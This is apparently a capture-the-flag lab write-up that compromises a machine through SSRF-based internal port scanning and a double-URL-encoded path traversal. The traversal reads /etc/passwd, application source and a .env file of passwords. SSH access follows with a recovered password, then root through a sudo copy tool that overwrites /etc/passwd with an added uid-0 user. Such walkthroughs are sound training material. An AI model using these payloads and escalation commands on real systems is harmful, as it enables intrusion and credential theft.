Running an aggressive TCP port scan using the command sudo nmap -sV -A 192.168.190.113 -p 22,80,8080 returns the output shown above. The target machine is running the SSH application OpenSSH 9.6p1 Ubuntu 3ubuntu13.5 on port 22. Based on the scan above, the target machine is running web applications on ports 80 and 8080. The web applications are run using Werkzeug/3.0.6 Python/3.12.3. No webpage is being served by the web application on port 80 due to the HTTP/1.1 404 NOT FOUND string. However, on port 8080, the HTTP title The Russian Doll Obsession is being served on port 8080. Time to check this out.

Enumeration

Port 8080: HTTP

The webpage shown in the picture above is returned for this web application. The web application has a Contact Me form, but it is not interactive at all. However, the string Bloggli v2.34 is located at the footer of the web application. It seems like the web application is running Bloggi and the version 2.34.


Checking through the source-code of the webpage, I identified the information shown in the picture above. It seems like the pictures in the websites are being loaded from /images/ directory on the localhost. Usually this is a good sign as the web application could be vulnerable to Remote File Inclusion (RFI) and Server-Side Request Forgery (SSRF). I performed a directory search using the command feroxbuster -u http://192.168.190.113:8080/ -w /usr/share/wordlists/dirbuster/directory-list-2.3-medium.txt -x php,html,txt,zip,jpg,yml,js,sql -d 6 --scan-dir-listings -C 404, but I didn't find anything useful. The scan lead to night useful either. I enumerated the web application on port 80, but I didn't find anything either. Time to enumerate this application further.

Exploitation

Exploitation: Server-Side Request Forgery to Identifying Internal Services via Internal Port Scan

I fired up burpsuite on my machine. Then I made a request to one of the images from the website; for example, http://192.168.190.113:8080/image?image=http://localhost/images/1.jpg. I intercepted this request as shown in the image above. To test for SSRF, I can just include the port I wish to scan after the /localhost/ part.


For example, in the image above, I removed the picture URL part and replaced it with localhost:22. This works successfully as the SSH application name & version is provided through a technique known as banner grabbing. Previously according to the port scan, only three TCP ports are open on the target machine: 22 (SSH), 80 (HTTP), and 8080 (HTTP). But there could be more ports open that are not being exposed externally; for example, internal service ports.


Performing an FTP port scan (21) returns the message shown in the picture above. The message Connection refused is returned as port 21 is closed. Now I know the web application is vulnerable to SSRF, I can perform an internal port scan.


On my machine, I ran the command seq 1 65535 > ports.txt first, as shown in the picture above on the top terminal. This creates a text file that contains the entries from 1 to 65535. I can pass this to ffuf to perform the internal port scan. To perform the internal port scan via SSRF, I ran the command ffuf -w ports.txt -u http://192.168.190.113:8080/image?image=http://localhost:FUZZ -fr "Failed to establish a new connection:" -fw 16. And bingo. It managed to obtain results for six ports: 22, 80, 4242, 8080, 45210, 46912. I checked these ports further and identified the last two ports (45210 and 46912) are false positives. However, the application on port 4242 is interesting.

I sent a cURL request to the application being served on port 4242 using the command http://192.168.190.113:8080/image?image=http://localhost:4242 and obtained the HTML webpage source-code shown in the output above. Exploitation: Server-Side Request Forgery to Local-File Inclusion Attack Against FILE VIEWER Application on Port 4242

And bingo. The webpage shown in the picture above is returned for this application on port 4242. Right away, I notice the Python exception error message ValueError: Missing 'file' parameter in request.. This applications seems to want us to use the parameter file. This opens new attack vector paths: LFI, Directory Traversal, etc. Let's summarise what we know about the web application so far. The web application on port 8080 is vulnerable to SSRF. Using SSRF, we can perform an internal port scan. This successfully returns the port 4242 being open and serving FILE VIEWER. This FILE VIEWER is running on Python, and wants us to use the file parameter. My VPN was having issues, so I connected again using different VPN. This target machine has the IP of 192.168.109.113.


When enumerating the web application, I obtained the error message ValueError: Absolute paths not allowed.. The web application has a WAF, or it is using a protection (such as blacklist filter) to prevent characters such as . and /. Even using URL-encoded characters does not lead to anything. There are many ways to bypass this defense such as double URL encoding, using approved paths, etc.


I intentionally broke the application by using the . as the file name. Then I obtained the result shown in the picture above. Our input gets fed into the path /var/www/cdn/images/. Then the application looks for the file name as the input. This is four paths that we will need to traverse out; for example, if I want to access the /etc/passwd file. Another interesting file name is the /var/www/fileviewer/file_viewer.py". This application's name is file_viewer.py. Accessing the source-code of the application could expose how the application works.


Enumerating the application further, I managed to bypass the protection in place by using double URL encoding. In the image above, I managed to successfully read the /etc/passwd file by using the payload ......//......//......//......//etc//passwd. This payload traverses out of the /var/www/cdn/images/ path using double encoding and access the /etc/passwd file. I notice there is a user called matryoshka on the target machine, as shown in the picture above. But I was unable to read their SSH key, id_rsa, using this.

                        <h2>Viewing File: {{ file_name }}</h2>
                    {% endif %}
                    {% if file_content %}
                        <div class="file-display">
                            <pre>{{ file_content }}</pre>
                        </div>
                    {% endif %}
                </div>
            </div>
            <footer>
                <p>File Viewer &copy; 2024</p>
            </footer>
        </body>
        </html>
    ''', title=title, header_message=header_message, file_name=file_name, file_content=file_content)

@app.route('/')
def home():
    try:
        file_param = request.args.get('file')
        
        if not file_param:
            return render_html_response(
                title="File Viewer",
                header_message="ValueError: Missing 'file' parameter in request."
            )
            
            
        file_param_clear = file_param.replace('../', '').replace('..', '.')
        
        if os.path.isabs(file_param) or os.path.isabs(file_param_clear):
            return render_html_response(
                title="File Viewer",
                header_message="ValueError: Absolute paths not allowed."
            )

        file_path = os.path.join('/var/www/cdn/images/', file_param_clear)
        
        if os.path.exists(file_path) and os.path.isfile(file_path):
            with open(file_path, 'r') as file:
                file_content = file.read()
            return render_html_response(
                title="File Viewer",
                header_message="",
                file_name=file_param,
                file_content=file_content
            )
        else:
            raise FileNotFoundError(f"File not found: {file_path}")

    except Exception as e:
        error_message = f"Error occurred: {str(e)}\n"
        error_message += f"File Parameter: {file_param_clear}\n"
        error_message += f"Decoded File Path: {file_path if 'file_path' in locals() else 'N/A'}\n"
        error_message += f"Traceback:\n{traceback.format_exc()}"
        return f"<pre>{error_message}</pre>", 200

load_dotenv(dotenv_path='./conf/.env')
if __name__ == '__main__':
    app.run(host='127.0.0.1', port=4242, debug=False)

Previously, I detected the application name is file_viewer.py. This is located inside the /var/www/fileviewer/ directory. Using the payload ......//......//......//......//......//......//......//var//www//fileviewer//file_viewer.py, I managed to access the source code of the file_viewer.py file, as shown in the output above. The source code of the application makes it clear it is using Search and Replace method to replace the ../ character, as stated in the line file_param_clear = file_param.replace('../', '').replace('..', '.') in the source code above. There is one more interesting line of code: the location of the configuration environment file as stated load_dotenv(dotenv_path='./conf/.env'). This configuration file could contain sensitive credentials, as shown in the output and picture below:

Foothold: Password Compromise of User matryoshka from .env via LFI

To access the configuration file, I used the payload ......//......//......//......//......//......//......//var//www//fileviewer//conf//.env. The full URL with the payload is http://192.168.109.113:8080/image?image=http://localhost:4242?file=......//......//......//......//......//......//......//var//www//fileviewer//conf//.env. And bingo. Now I have access to the .env file which contains the sensitive credentials. I notice this file has four hardcoded passwords as labelled EMAIL_PASSWORD, as shown in the picture above. These passwords are different for each development stage. Maybe I can attempt credential stuffing for the user matryoshka?


And bingo. Now I have an SSH foothold on the target machine as the user matryoshka using the command ssh matryoshka@192.168.109.113 and the password SimulationGreySpin432542. Time to elevate my privileges.

Privilege Escalation

Vertical Privilege Escalation: User matryoshka to User root via /etc/passwd File Edit via image_tool

Running the command sudo -l returns the entry (ALL) NOPASSWD: /var/www/cdn/image_tool as shown in the image above. We can run this binary as root without even having to enter their password.


I browsed into the /var/www/cdn directory. Then I ran the command ./image_tool and obtained the information shown in the picture above. This binary is used to manage images in the /var/www/cdn/images directory. After using the binary for some time, I notice the most useful one is the backup option with the flag -b. This can be used to create a backup/copy of the input file. The retire option with the flag -t is used to delete files. I also noticed the input file must be an image file. Running strings on this binary shows it is using cp %s %s. Therefore, it's just a copy of the file. After some time, I managed to escalate privileges on the machine.


Using the command cp /etc/passwd passwd, I managed to copy the contents of /etc/passwd file over at /var/www/cdn/images. This new file is named passwd at /var/www/cdn/images directory.


Using the command openssl passwd rooted, I created a new hash of the password rooted. The new password hash is $1$V0.4T8cY$y0ERIkAyMKIE/hRcFRows0. Then using the command echo 'super:$1$V0.4T8cY$y0ERIkAyMKIE/hRcFRows0:0:0:root:/root:/bin/bash' >> passwd, I created a new user called super with root privileges. This user's password is rooted and it is inserted in our edited passwd file. Since the input source file is checked to ensure it is an image file, I renamed it to passwd.jpg using the command mv passwd.jpg passwd over at /var/www/cdn/images directory. My privilege escalation vector is to replace the /etc/passwd using the contents of the passwd.jpg file that contains the user super with root privileges.


Then I ran the command sudo -u root /var/www/cdn/image_tool -b passwd.jpg /etc/passwd to backup the file passwd.jpg to replace the /etc/passwd. This ran successfully as the /etc/passwd file got replaced by the contents of passwd.jpg. I ran the command su super and the password rooted. And bingo. Now I have root privileges on the target machine as shown in the picture above.

The two flags, proof.txt and local.txt, are shown in the image above.
